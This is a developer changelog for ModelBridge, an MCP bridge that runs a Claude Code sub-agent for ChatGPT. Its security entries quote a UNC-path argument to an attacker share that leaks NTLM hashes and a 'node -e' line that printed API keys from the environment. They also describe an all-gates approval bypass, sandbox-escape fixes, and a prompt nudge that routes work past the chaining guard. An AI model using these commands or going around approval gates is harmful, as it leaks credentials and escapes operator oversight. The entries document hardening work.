# Changelog

All notable changes to this project are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- **`npm run setup` — a guided first-run wizard, in English or Chinese.** Every question the manual setup path asks in prose is now asked as a question: which model and its API key, which harness, which directories the sub-agent may touch, a temporary or fixed hostname, and whether the sub-agent asks before running commands. It then writes `.env`, starts the service, opens the tunnel and prints the connector URL. It is deliberately assembled out of the commands that already exist — `cmdStart`, `cmdTunnel`, `cmdUrl`, `writeEnvKey`, `mask` — rather than reimplementing any of them, because a second implementation of a security rule is how the two drift apart. Language resolves as `--lang zh|en` → `BRIDGE_LANG` → the OS locale → English, so a Chinese Windows gets Chinese with no flag and a CI run gets English. The pure half (text, language detection, URL building, probe-response classification) lives in `scripts/setup.mjs` with **no non-builtin imports at all**, because the wizard has to run on a bare clone — before `npm install` — which is exactly when it is needed. `scripts/test-setup.mjs` covers it (19 cases, now part of `npm test`), including a red-line check that no message in either language prints a hostname that is not a placeholder or a public vendor — the deploying operator's own domain is excluded by not being on that list, so the guard never has to spell out the string it exists to keep out of the repository.
- **The wizard proves the key before it writes it.** One `POST …/anthropic/v1/messages` with `max_tokens: 4` and the word "ping", and the status code is classified rather than reported raw: 401/403 is a bad key, 404 is a wrong address, 429 counts as **usable** (authentication happens before throttling, so a throttled key is a working key), 5xx is the provider's problem. A retry re-asks the address and the model name too, not just the key, because a 404 is almost always the address and re-asking only the key would trap the operator in a loop re-pasting something that was never wrong. The endpoint's response body is printed for the cases where it is the only thing that distinguishes a bad model name from a bad request shape — through `mask()`, because it is a string this process did not write and endpoints quote requests back.
- **The wizard reads the terminal itself, and once.** `readline.createInterface` reads *ahead* into its own buffer, so a second interface opened after the first is closed finds the pipe already drained: invisible interactively, and fatal to any scripted or redirected run, where every answer after the first vanished — which is how the bug was found, in the wizard's own end-to-end test, printed as a clean "EOF" one question in. `Terminal` owns the buffer, so question two gets line two. It also owns raw mode, which on Windows belongs to the *console* rather than the process and is not restored on exit, so `process.on("exit", …)` closes it — without that a Ctrl+C leaves the operator's shell with no echo and no line editing, which reads as a broken terminal. The one credential question (the API key, and a named tunnel's token) is masked on screen, and the doc says plainly what that is: a screen-level courtesy, not a security boundary.
- **`windows/0-首次安装.bat`**, the double-click version. Pure ASCII, like the others, for the byte-offset reason in Fixed.
- **`npm run auto:on` — a temporary approval bypass that revokes itself on restart.** The bypass is a flag file (`.state/auto-approve`), not an `.env` key, because `dotenv` freezes the environment at boot and the whole point is that it takes effect on the **next job** with no restart. `src/server.ts` deletes the flag on every start, so `reload`, `restart` and a reboot all return to "needs approval" without anyone remembering to. `npm run auto` shows the mode, `npm run auto:off` restores approvals, `ctl status` carries a standing `⚠️ 完全放行` line so the state is visible in any status check, and `windows/9-完全放行.bat` / `windows/10-恢复审批.bat` are the double-click versions. `npm run auto:on` **refuses while the server is stopped** rather than writing a flag that the next boot would immediately clear. The honest framing is in the Security model of both READMEs: this is not "fewer prompts", it is every gate at once.
- **Named tunnels — a public URL that survives restarts (`TUNNEL_MODE=named`).** The default quick tunnel is handed a fresh random `*.trycloudflare.com` hostname on every start, so each `restart` costs a trip to ChatGPT to rebuild the connector. With a domain already on Cloudflare, `npm run ctl -- tunnel named mcp.example.com` asks for the tunnel token, writes `TUNNEL_MODE` / `TUNNEL_HOSTNAME` / `TUNNEL_TOKEN` into `.env` for you, and from then on the URL never moves. Two things had to change underneath: `findTunnelUrl()`'s `trycloudflare.com` regex would never match a named tunnel (its address is *configured*, not *discovered*, so named mode skips the wait-and-scrape entirely and validates the config instead), and `cmdTunnel` had assumed `cloudflared tunnel --url`. `TUNNEL_NAME` is supported as an alternative to the token for people who created the tunnel with the CLI. Nothing is hardcoded: no domain of anyone's appears in the code or the docs, and `.env.example` carries placeholders only.
- **`npm run ctl -- tunnel check`**, which validates the named-tunnel config and names what is missing, and reports "registered with the edge" and "the hostname actually answers" **separately** — they are different facts, and the gap between them is the mode's characteristic failure. A named tunnel with no published route in the Cloudflare dashboard reports a healthy `Registered tunnel connection` locally and returns 404 publicly, because the route lives in Cloudflare's cloud rather than on this machine.
- **`npm run url`** copies the full connector URL (`https://<host>/mcp/<secret>`) to the clipboard and prints it, so rebuilding a connector no longer means hand-selecting a long secret out of `status --show`. Uses `clip.exe`; if that fails it prints and moves on rather than erroring.
- **`windows/9-完全放行.bat` and `windows/10-恢复审批.bat`**, the double-click launchers for the bypass. Their bodies are pure ASCII on purpose — see Fixed.
- **`npm run ctl -- auto`** joins the `ctl` surface, with `npm run auto` / `auto:on` / `auto:off` as the non-technical shortcuts.
- **`windows/11-固定域名.bat`**, the double-click path to a fixed hostname. The two Cloudflare dashboard steps cannot be automated from here — they live in the operator's own account — so the launcher prints them, asks for the hostname and the token, runs `ctl tunnel named`, and then asks whether the route is already saved before switching anything over. It switches only on a `Y`: the address is *configured*, not *discovered*, so a half-finished setup does not fail loudly, it fails as a healthy-looking tunnel in front of a domain that 404s. Its body is ASCII-only, like the others — see Fixed.

- **README: what the bypass does and does not cover.** The Security model now carries a four-row table of the gates that vanish together in bypass mode, states that `DEEPSEEK_ALLOWED_ROOTS` still governs which directories may be *opened as a workspace*, and says honestly that per-command `approval_requested` / `approval_auto` records are **not written** in bypass mode because the process that writes them is not running — what remains is the mode-change lines and the harness's own tool-call trace in `.state/jobs/<id>.json`. A record is not an interception.
- **Agent jobs.** `deepseek_agent_start` / `deepseek_agent_poll` turn the bridge from a one-shot Q&A tool into something that can be given a task and left to finish it: the sub-agent reads and edits files, runs commands, and iterates across steps until it is done. Jobs are asynchronous because a real task outlives ChatGPT's ~60 s tool-call budget; `agent_start` waits up to 45 s for a fast job and hands back a job id otherwise.
- **Claude Code as the harness.** A job spawns `claude --output-format stream-json` against the DeepSeek Anthropic-compatible endpoint, so the loop, context compaction, prompt caching and tool implementations are the ones Claude Code already ships rather than a hand-rolled imitation.
- **Out-of-band approval queue.** Commands outside `BRIDGE_APPROVE_ALLOW` pause the job instead of failing it. The prompt is a stdio MCP server owned by the harness process — deliberately *not* reachable over the capability URL, so a caller cannot approve its own commands. Unanswered requests deny; there is no default-allow path.
- **`src/sandbox.ts`**, the single place a caller-supplied string becomes a real path. Rejects UNC paths, `\\?\` device namespaces, NTFS alternate data streams, reserved device names, and trailing dots/spaces; resolves the deepest existing ancestor with `realpath` so junctions cannot walk out; requires a separator at the prefix boundary. `npm run test:sandbox` is the escape regression suite.
- **`src/harness/file-guard.ts` — the workspace boundary for file tools.** `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Glob` and `Grep` had no path check at all: the harness's `--add-dir` was assumed to be holding the line, but `--add-dir` only *adds* an accessible directory and restricts nothing, while the approval prompt waved every non-command tool through on the grounds that it was covered. It reuses `sandbox.admit()`, so junctions, 8.3 short names, UNC paths, alternate data streams and trailing dots are one implementation with one suite, `npm run test:guard` (12 cases). Relative paths are resolved against the workspace first, or a model passing `path="."` — which it does constantly — would be rejected as an empty path and every `Grep` would stall for a human. Network tools (`WebFetch`, `WebSearch`) now always require a human too: the workspace governs what comes in, and nothing governed what goes out.
- **Job registry** (`src/agent/jobs.ts`): per-job `AbortController`, concurrency cap, wall-clock ceiling, on-disk snapshots, and a nonce that appears only in the final result — so a caller that cannot quote the nonce does not have a result. (No step ceiling here: this layer cannot count steps, since only the runner sees the model's tool calls. It previously read a `maxSteps` option and never used it, which read as "the registry enforces 24 steps" while the real ceiling lived in `claude-code.ts`.)
- **New `ctl` commands**: `jobs`, `jobs <id> --trace`, `job kill <id>`, `pending`, `approve <id>`, `deny <id>`, `audit`.
- **`BRIDGE_WORKSPACE`**, injected by the harness once per job. It is how the approval server learns the boundary it is enforcing, and it is not meant to be set by hand.
- **`npm run accept`**, an acceptance suite that asks the real model three questions a chat-only model cannot answer: reproduce a random string that exists only in a file, debug a script that must be run before its bug is knowable, and admit that a file does not exist rather than inventing contents.
- **`npm run ctl -- rotate`.** A new secret, a server-only restart, and the new public URL on your clipboard. It leaves the tunnel alone — `npm run restart` kills it, which changes the public hostname and costs a second trip to the connector for no reason. On Windows, `windows/7-轮换密钥.bat` is the same thing from a double-click.
- **Two model-behaviour limits documented**, both found while validating the agent path end to end. A calling agent (ChatGPT) may refuse to dispatch a task that hands a local file to an external model and will ask for explicit authorisation. And a sub-agent will state, confidently and wrongly, that nothing left your machine — it cannot see its own hosting. See README troubleshooting and `SECURITY.md`.
- **`npm run ctl -- reload`.** Restarts the server and leaves the tunnel alone, so the public URL is unchanged and the ChatGPT connector needs no edit. `restart` stops the tunnel too, which is right when the tunnel is the thing being replaced and wrong every other time.
- **`npm run ctl -- allow "<dir>"` / `allow --remove "<dir>"`.** Add or drop a workspace root without hand-editing `.env`; it writes the file and reloads, so the tunnel and URL are untouched. The gate it opens is the same one that decides how much of the machine the holder of the URL can write to, so the command refuses a drive root, your profile directory or `C:\Users` unless `--force` is passed, and reprints the whole allow-list and what it costs before every reload. This exists because hand-editing was the reason a job silently degraded: the sub-agent could see the gate, had no way through it, and the caller quietly substituted a same-vendor reviewer — which is exactly the independence the bridge is for.
- **The README now opens with what the bridge is actually for.** One sentence and a four-row table — an external model cannot be registered as a sub-agent slot, so the only way to run one is as an MCP tool, and this bridge hands that tool a full agent harness rather than a bare API. The measured run is cited as the evidence, with the default-off warning directly beneath it.
- **README: why the connector has to be recreated, and three ways to stop doing that.** ChatGPT's connector form may have no edit-URL action at all, and a Cloudflare quick tunnel gets a new random hostname on every start — so the two together force a rebuild. The documented options are: do nothing (`reload` plus a `ctl` that no longer prints the secret keeps the URL still in normal use), a tunnel with a permanent hostname, or a named tunnel on a domain you own.
- **README: what a host-model swap does and does not change.** Both READMEs now state that the bridge's value comes from one platform constraint — sub-agent slots are not open to external models — rather than from which tier the caller runs, so changing tiers leaves it doing the same job. Re-pointing the sub-agent side is two `.env` lines (`DEEPSEEK_BASE_URL`, `DEEPSEEK_MODEL`) plus `reload`. The only change that would make it redundant is platform-level, and is named.
- **Partial results from a job that was stopped early.** A sub-agent cut off by the step ceiling, the wall clock or `job kill` now returns what it had already read and reasoned about, and the tool payload renders it under a warning that it is a half-finished record rather than a result. The job still settles as `error` and still gets no nonce — a truncated review is not a review — but the reading is no longer thrown away. It doubles as the cheap way to resume: the caller can narrow the task to one part of the record and re-dispatch instead of starting over. A stop used to return a single line of error text, which is indistinguishable from "it never got anywhere".

### Changed

- **`npm run tunnel` now checks that something is actually answering on the local port before it publishes anything.** `isAlive(pid)` is not the same question as "the service is up": `npm start` spawns a shell, the shell outlives the node process it launched, so when `src/server.ts` dies at boot — a missing dependency, a malformed `.env`, a port already taken — the PID in `.state/server.pid` stays alive and `currentStatus()` reports a healthy service. Found in the wizard's own end-to-end test, which printed a public URL and copied it to the clipboard while the server behind it had been dead for the whole run; the only symptom an operator would see is ChatGPT failing to connect, which reads as a ChatGPT problem. A tunnel in front of a dead port can never work, so this now refuses, names the log file and points at `npm start` in the foreground. Loopback only, so the proxy-hairpin caveat on the public-URL probe does not apply.
- **The project is now ModelBridge.** `deepseek-mcp-bridge` named a project after its default model, and the default model is not the point: the bridge gives an MCP host a working sub-agent whose brain can be any Anthropic-compatible endpoint, and re-pointing it is two `.env` lines. Renamed across both READMEs, `package.json`, the docs, the launcher titles and the GitHub repository. **The MCP tool names (`deepseek_flash`, `deepseek_agent_start`, `deepseek_agent_poll`) and the `DEEPSEEK_*` / `BRIDGE_*` environment variables are deliberately unchanged**, so an existing ChatGPT connector and an existing `.env` keep working with no edit.
- **`BRIDGE_CC_APPROVAL=off` is documented as what it is.** Both READMEs and `.env.example` now say that it stops `approval-mcp.ts` from being spawned at all — so the command allow-list, the chaining guard and the file tools' workspace boundary go with it — and that it does **not** reset on restart, which is precisely why it is a poor everyday switch next to `npm run auto:on`.
- **Rate limiting was wrong in both directions and is now one honest bucket.** The server set `trust proxy`, so Express took the caller's `X-Forwarded-For` as the client address and the limit became "20 requests per minute *per made-up IP*" — a header the caller writes, defeated by changing it. It also counted every request rather than tool calls, so in stateless mode a single poll (initialize, `tools/list`, `tools/call`) cost three of the twenty and a long job could 429 itself with its own polling. It now counts `tools/call` only, in a **global** window, default raised `20` → `60`. The per-IP framing was never true for a loopback server behind a tunnel; one bucket is worse-sounding and correct.
- **`deepseek_flash` no longer implies a 1M-token input.** The tool description and the `files` parameter read as though the model's context window were the amount of material this path can carry. The server caps a JSON body at 2 MB. Both the tool description and the READMEs now say so, because the failure mode is a caller inlining a large file and concluding the model ignored it.
- **`resultTtlMs` defaults to 30 minutes, not 10.** Job snapshots were swept a third of the way into the default job timeout (`BRIDGE_JOB_TIMEOUT_MS`, 30 min), so a long job could be collected before the caller ever polled for it — which reads as "the result is gone" and the obvious next move is to run it again, at full cost.
- **`deepseek_agent_start` no longer takes a `mode`.** The parameter was accepted and recorded and never read by the harness — a knob that did nothing, in a schema where every other knob does something. Removed from the schema; `selftest:memory` asserts it does not come back. `JobInput.mode` survives as an optional recorded field.
- **The approval prompt now says *why* it is asking.** Each pending line carries the reason — chained command, first word not on the allow-list, path outside the workspace, network tool — instead of only the raw text. `npm run ctl -- pending` is where an operator decides whether to approve a command, and "which rule caught this" is most of that decision. A denial tells the sub-agent not to look for a way around it.
- **The harness no longer inherits the parent environment wholesale.** See Security below.
- **Both job ceilings raised: 40 → 120 steps and 15 → 30 minutes.** 40 steps was below the cost of one read-only review of this repository — a real dispatch died at step 41 and reported nothing, and the caller had no way to tell a nearly-finished run from one that never started. 120 leaves room for a project-sized reading pass. The registry's own hard wall is now derived from the runner's timeout (`timeoutMs + 60 s`) instead of defaulting independently to 20 minutes, which had been silently capping every job whose runner was given longer than that and reporting the loss as a plain cancellation.
- **The anti-chaining prompt now covers Bash as well as PowerShell, with examples.** The appended system prompt told the sub-agent to avoid multi-statement command lines because the chaining guard routes them to a human, but named only PowerShell — and a validation run promptly issued `find ... | head -100` through the Bash tool and stalled the job in `waiting_approval`. A pipe is a pipe in either shell. The guard itself is unchanged: this is prompt-level guidance, and a run that ignores it still pauses for approval.
- **The appended system prompt now says how to spend steps.** Prefer Glob/Grep over recursive listing, use `offset`/`limit` on large files, batch independent reads into one turn, and write confirmed findings into a report file as it goes rather than holding everything for a final answer — so a run that is stopped still has written output on disk.
- **`ctl` no longer prints the capability secret.** `status`, `start`, `tunnel` and `secret` render it as `<密钥已隐藏>`; `--show` prints it in full. Every printed copy outlives the moment — scrollback, a shell transcript, a log pasted into a bug report — and the only real leak this project has had came from `ctl` printing it, not from anyone finding it. `rotate` still puts the full URL on the clipboard, because a clipboard is not a log.
- **The pre-approved command list gained PowerShell's read-only cmdlets** (`Get-Content`, `Get-ChildItem`, `Test-Path`, `Select-String`, `Get-FileHash`, and eleven more). The Unix names it already had barely exist on the platform this actually runs on, so on its own that half was close to decorative — validation runs kept waking a human for a command whose first word could not have been on it. Read access is not widened by this: `type C:\...\.env` has been auto-approved since the list existed.
- **Every job now carries an appended system prompt** telling the sub-agent to write a small script and run it with `node`, rather than reaching for a multi-statement PowerShell one-liner. `node` is pre-approved and `node reverse.mjs` contains none of the characters the chaining guard looks for, so the same work runs unattended. It is a nudge, not enforcement — the gate is unchanged, and a run that ignores it still pauses for a human.
- `src/deepseek.ts` now returns the full assistant message (including `tool_calls` and `reasoning_content`) instead of a bare string; `callDeepSeek()` remains as a behaviourally identical wrapper.
- The empty-content retry no longer fires on a tool-call turn, where empty content is normal — previously each step of a tool loop would be sent twice.

### Security

- **A UNC path in a command argument is now refused.** `type \\attacker\share\x` begins with a pre-approved word, but Windows resolves the name before the command runs, and that resolution hands the account's NTLM hash to whoever answered — an outbound credential no read-only command can otherwise produce. The allow-list reads the first word only, so an argument containing `\\` gets its own rule. `SECURITY.md` now also states plainly that the allow-list constrains the *program* and never its arguments, and that approving a reader approves every file the process can read.
- **The sub-agent no longer inherits the bridge's own credentials.** The harness was spawned with the full parent environment, so a single pre-approved `node -e "console.log(process.env.DEEPSEEK_API_KEY)"` — `node` is on the allow-list by design — printed the DeepSeek key and `MCP_PATH_SECRET`, which is the capability URL. `claude-code.ts` now deletes every inherited variable whose name looks like a secret (`API_KEY`, `_KEY`, `SECRET`, `TOKEN`, `PASSWORD`, `PASSWD`, `CREDENTIAL`) before spawning, which also removes an operator's unrelated `CLAUDE_CODE_OAUTH_TOKEN` and anything else that had no business in a sub-agent's environment. **One variable is kept deliberately: `ANTHROPIC_AUTH_TOKEN`** — it is the DeepSeek key the harness runs on, and without it no model call happens. So that key stays readable by anything the sub-agent runs; treat it as such, with a spend cap. `SECURITY.md` states this as an honest limit rather than implying the scrub is complete.
- **The full endpoint is no longer written to the log.** It already had been: `.state/server.log` held 16 startup lines carrying `/mcp/<the real secret>`. The startup line is masked, and `ctl logs`, `ctl audit`, `ctl jobs` and `smoke` all run their output through a mask that replaces the literal secret value — log lines and job results are free text, so hiding the URL *shape* is not enough when a sub-agent may have printed the secret itself. The reason this matters more than it sounds: the only real leak in this project's history came from its own log file, not from anyone guessing.
- **Job nonces and job ids are drawn from `crypto.randomInt`, not `Math.random`.** The nonce is the one value in this system that someone would want to predict: it is the entire evidence that a result is real, so a predictable nonce makes a fabricated result indistinguishable from a genuine one. `Math.random` is not a cryptographic generator and its state is recoverable from a handful of outputs.

### Fixed

- **The wizard said "staying read-only" over a `.env` that still listed workspace roots.** Pressing Enter at the directories question means "I am not adding one", not "make it read-only" — and since the list is appended to rather than replaced (deliberately: a wizard run must not be how roots added with `ctl allow` disappear), a rerun over an existing `.env` left those roots in force while the screen said the bridge was read-only. It now prints the list that stays in effect. The roots list appears nowhere else in that run, so there was no way for the operator to catch it.
- **The launcher `.bat` files cannot contain non-ASCII text, and now do not.** `9-完全放行.bat` was first written with the Chinese explanation inline, and cmd.exe executed garbage fragments of it: `'o.' 不是内部或外部命令`, `'orkspace'`, `'�了关也没关系�?echo'`. Cause: cmd reads a batch file by **byte offset** computed before `chcp 65001` on line 2 takes effect, so multi-byte characters desync the parser. Measured with three variants of a minimal file (UTF-8 without BOM + `chcp`, UTF-8 with BOM + `chcp`, GBK with no `chcp`): the short file survives, a longer one with an `if (...)` block does not. All Chinese now comes from Node — `call npm run auto` prints the warning before the Y/N prompt — and both new launchers are ASCII-only. This retroactively explains why all eight pre-existing launchers are English despite their Chinese filenames.
- **Every instruction for creating a tunnel and adding its route named a menu that no longer exists.** Cloudflare moved tunnels in February 2026: creating one is now `Networking → Tunnels → Create a tunnel`, and the old `Zero Trust → Networks → Connectors` entry redirects to the same page — while a route is no longer a bare `Public Hostname` button but `Routes → Add route → Published application`, which splits the hostname into separate Subdomain and Domain fields. Thirteen sites across both `ctl.mjs` and `setup.mjs`, both `.env.example` files and three READMEs were telling the operator to look for the old ones. A stale menu name is not cosmetic here: these strings are the whole instruction, they are read at the one moment the operator cannot proceed without them, and the step they describe is the one whose omission produces a tunnel that reports itself healthy while the domain returns 404. Three of the new strings keep the old path in a parenthetical, deliberately — someone following a blog post needs to be told the two are the same page.
- **The first pass over that rename missed every site that named the button without the menu in front of it.** Searching for the full path — `Zero Trust → Networks → Tunnels → … Public Hostname` — finds only the places that spelled the whole thing out. "The trap is forgetting the `Public Hostname` in the dashboard", "the `Public Hostname` you set", and one line the operator is shown in `ctl status` all refer to the same control by name alone, and every one of them was still sending someone to look for it. A grep for a path is a grep for a sentence, not for a concept. Nine further sites, in the same files plus `CHANGELOG.md` itself. Two source comments that describe the failure mode rather than point at a control are left as they are.
- **The claim that the script passes `--protocol http2` was never true.** The 1.0.0 note (and a README paragraph) said the quick tunnel was started with `--protocol http2`, "needed where QUIC is blocked". No version of `ctl.mjs` ever passed it. `--protocol` does exist and does work, but it is a **hidden flag**: it appears in none of `cloudflared --help`, `cloudflared tunnel --help` or `cloudflared tunnel run --help`, which is how the false claim survived — reading the help text is not evidence of absence. It is now exposed as the optional `TUNNEL_PROTOCOL` env key (unset = let cloudflared probe) and documented for the case it actually solves: behind a TUN-mode VPN, where outbound TCP/7844 is swallowed while UDP passes through, so the probe's own pre-check reads `TCP Connectivity FAIL` / `UDP Connectivity PASS`.
- **File tools could read anywhere on disk, with no prompt, in a fully released build.** The workspace was believed to be enforced by the harness's `--add-dir`; it is not — `--add-dir` only extends what the harness may touch, and the approval prompt waved every non-command tool through on that assumption. Measured on `5cb8add`: a job whose workspace was `D:\project` read a file thousands of directories outside it in **2 steps, no approval**, and copied the contents into the workspace. After the fix the same task stops at `waiting_approval` and the content never enters the run, while in-workspace reads and writes still complete unattended in 2 steps — so the normal case was not made slower. `npm run test:guard` covers the boundary itself offline, without a model.
- **An un-attributable approval call was the one path that skipped the fail-closed check.** `approval-mcp.ts` verified that `BRIDGE_JOB_ID` and `BRIDGE_STATE_DIR` were present, but that check sat *after* the branch that allowed every non-command tool unconditionally — so a call the server could not attribute to a job or a state directory was exactly the call that bypassed the check. The check now runs first.
- **Everything a sub-agent had done was discarded when its job was stopped.** Hitting the step ceiling or the wall clock threw the run away and returned one line of error, so a review that had read forty files came back looking identical to one that had read none — and the caller re-dispatched the whole task from the start. The run now returns its notes and its tool-call tally, marked `incomplete`.
- **Cancellation reported as failure.** A job stopped with `job kill` settled as `error`, telling the caller the sub-agent had crashed when a person had in fact stopped it.
- **45-second process leak per call.** `Promise.race` does not cancel its loser, so the synchronous-window timer kept the event loop alive long after every `agent_start` had returned.
- **The MCP server advertised a version this repository has never had.** It reported `2.0.0` while `package.json` said `1.0.0`, so every client was told the wrong thing. Now `1.0.0`, with a comment tying it to the package.
- **Every job record named a harness that had never run.** The `harness` field was the literal `"pending"`, which no code ever overwrote — so a record written after a successful run still claimed no harness had been picked. Whoever chooses the runner now supplies `harnessName`; the default is `"unknown"` rather than a state that reads as "still deciding".
- **Corrected a false claim about native sub-agents that both READMEs had been repeating.** The docs said a ChatGPT sub-agent runs sandboxed with no filesystem access on a ~60 s budget, and sold this bridge as taking down those two walls. That is wrong: a native sub-agent does read and write files on your machine and can carry a multi-step task to completion. The project contradicted itself — its own Sol-prompt guidance tells users to route tasks that "need to read and write local files" *to* the Luna sub-agent, two sections below a table claiming Luna cannot. The honest premise is narrower and was already stated in [Why this exists](#why-this-exists): **sub-agent slots only accept OpenAI's own tiers**, so an external model can only arrive as an MCP tool, and a bare MCP tool is a text interface — what this project adds is the harness that lets that external model actually work. Both comparison tables now contrast *executors* rather than *capabilities*, and the efficiency claim ("fewer steps, a higher chance of getting it right the first time") is marked explicitly as an unbenchmarked impression rather than data.
- **`ctl status` reported a healthy edge through a tunnel that had been dead for twelve hours** — the check that would have caught the 2026-09-21 outage instead of leaving the caller to guess. A registration is a *moment*, not a state: cloudflared runs four connections and the tunnel works only while at least one is still up, so the honest question is what cloudflared logged **last** for each `connIndex`. The rule was `lastIndexOf("Registered tunnel connection") > lastIndexOf("Unable to establish connection with Cloudflare edge")`, and both halves of it were wrong. That error string is what a *blocked* edge produces; a tunnel that registers and *then* loses its connections logs `Connection terminated`, `Failed to dial` and `Retrying connection in` instead, and none of those matched the search. Replayed against the thirteen runs in `.state/tunnel.log`, the two rules disagree on **seven**, and every one of the seven is a run whose last event per connection was a down event while the old rule still called it healthy. The one that mattered: started 2026-09-20T13:32Z, last registration 14:32Z, then twelve hours of `Failed to dial` against stale proxy DNS until it was killed — old rule 已连上边缘 throughout, new rule 未连上边缘, and the caller's tool calls failing with a generic `Mcp error: -32603: Internal error` for the whole window. A status check that lies in the one direction that looks like health is worse than no status check at all.
- **`npm run smoke` showed a red FAIL against a perfectly healthy tunnel.** Its first check, `GET /health`, is the request that absorbs the cold start after a tunnel comes up or has been idle, and Cloudflare can fail that one request while every request after it succeeds. Measured 2026-09-21 against a freshly restarted tunnel: the check came back empty and six immediate requests to the same URL all returned `{"ok":true}`. One retry, 1.5 s later. The detail line in those same two lines was dead code — `JSON.stringify(null)` is the string `"null"`, which is truthy, so the `无响应` branch could never print and the operator was shown a bare `null` where "no response" was meant. `scripts/smoke.mjs` only.
- **`deepseek_flash` returned no answer for any task that needed real thinking, and reported the truncation as a failure rather than as a budget problem.** `deepseek-flash` is a reasoning model whose thinking comes out of the **same** `max_tokens` budget as its answer, and that budget defaulted to 4096. Measured 2026-09-21 on one adversarial-review prompt: at 4096 — `finish_reason: "length"`, `reasoning_tokens: 4096`, `content: ""`; the reasoning consumed the budget *exactly* and the answer never started. At 16384 the same prompt finished — `finish_reason: "stop"`, `reasoning_tokens: 4816`, 2617 characters of answer. The default is now 16384, and `DEEPSEEK_TIMEOUT_MS` goes 90 s → 180 s with it: reasoning generates at 165–210 tok/s, so the full budget is 80–100 s of wall clock, and raising the ceiling without raising the deadline would only have traded an empty reply for a timeout. The retry was wrong in the same place, and this is the part worth keeping: it re-sent the **identical** request after a `length` truncation — three lines below a comment explaining that a retry is for transients — and since the trigger is the request itself, it reproduced the truncation in the same spot for a second paid call and another ~21 s of the caller's tool-call window, then described the result as "twice". It now fails on the first attempt and reports the reasoning-token count, which is the number that separates "raise the ceiling" from "split the task". The retry survives for the case it was written for — `finish_reason: "stop"` with empty content, measured at roughly 1 call in 10 — and two regression tests cover both, one of them asserting that the `length` path makes exactly one request.

## [1.0.0] - 2026-09-11

Initial release.

### Added

- MCP server exposing a single `deepseek_flash` tool over Streamable HTTP, stateless transport (`sessionIdGenerator: undefined`, fresh server + transport per request).
- Capability-URL authentication: the MCP endpoint lives at `/mcp/<secret>`; bare `/mcp` and wrong paths return 404.
- Per-IP sliding-window rate limiting (default 20/min).
- Loopback-only binding by default (`HOST=127.0.0.1`).
- Four task modes (`analyze`, `review`, `code`, `summarize`), each with its own system prompt; `review` explicitly treats any author conclusion in the material as an unverified claim.
- SSE response streaming to avoid Cloudflare's ~100 s edge (524) timeout on long calls.
- Automatic single retry when `deepseek-flash` returns empty `content` (reasoning-only output), with a descriptive error if both attempts are empty.
- Lifecycle CLI (`ctl.mjs`): `start`, `stop`, `restart`, `status`, `logs`, `enable`, `disable`, `tunnel`, `untunnel`, `uninstall`, `secret`.
- Cloudflare quick-tunnel management with automatic URL discovery.
- Verification: in-memory MCP self-test (`npm test`), public-endpoint smoke test using Node `fetch` (`npm run smoke`), and per-request access logging that distinguishes a real tool call from a narrated one.
